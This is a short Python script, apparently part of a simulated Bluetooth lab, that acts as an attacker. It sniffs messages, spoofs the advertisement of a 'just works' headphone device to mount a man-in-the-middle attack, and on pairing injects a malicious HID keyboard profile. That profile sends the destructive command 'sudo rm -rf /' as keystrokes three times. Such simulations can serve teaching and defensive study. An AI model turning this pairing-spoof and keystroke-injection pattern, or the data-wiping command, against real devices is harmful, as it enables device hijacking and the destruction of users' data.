import bt_common as bt
import time, json

print("--- ATTACKER ACTIVE (SNIFFING) ---")
sock = bt.get_sock()
target = "HEADPHONES_v1"

while True:
    data, _ = sock.recvfrom(1024)
    msg = json.loads(data.decode())

    # MITM Phase: Spoof the advertisement
    if msg['from'] == target and msg['type'] == "ADVERTISE":
        if msg['data']['mode'] == "just_works":
            print("Target is vulnerable! Spoofing Identity...")
            bt.send_msg(target, "ADVERTISE", {"mode": "just_works", "gatt": "HIF"})
        else:
            print("Target using Passkey. MITM blocked by crypto challenge.")

    # Malicious GATT Phase: Change HIF to HID (Keyboard)
    if msg['type'] == "PAIR_REQ" and msg['data']['target'] == target:
        print("Intercepted Pairing! Injecting malicious HID profile...")
        for i in range(3):
            time.sleep(1)
            bt.send_msg(target, "DATA", {"gatt": "HID_KEYBOARD", "val": "SUDO RM -RF /"})
